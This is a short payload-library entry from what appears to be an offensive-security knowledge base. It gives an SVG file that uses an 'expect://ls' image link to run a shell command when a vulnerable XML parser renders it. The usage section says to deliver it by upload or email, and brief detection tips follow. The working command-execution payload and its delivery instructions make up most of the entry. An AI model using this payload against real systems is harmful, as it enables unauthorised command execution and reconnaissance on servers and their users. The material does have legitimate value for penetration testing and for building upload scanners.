---
id: 97491e9f-2c67-4226-9925-abb87f27949d
name: SVG-XXE-List-Directory-Using-Expect
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.558697+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - xxe
  - svg
  - directory-listing
validated: true
---

# SVG-XXE-List-Directory-Using-Expect

## Code

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

## Description

This XML code snippet embeds an XXE payload in an SVG image using the 'expect://' protocol to execute a directory listing ('ls') command when the SVG is parsed by a vulnerable client application.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| expect://ls | Protocol handler and command to execute | expect://pwd (for current path) |

## Usage

Embed this in an SVG file and deliver via upload or email. When opened in a vulnerable renderer (e.g., legacy image viewer), it triggers the command execution, potentially displaying directory contents in the image or logs.

## Detection

- Monitor for unusual protocol handler invocations in application logs.
- Scan uploads for 'expect://' or other command injection patterns in SVG files.
- Enable external entity disabling in XML parsers.

## Related

- [[procedures/XXE-Injection-via-SVG-Image]]
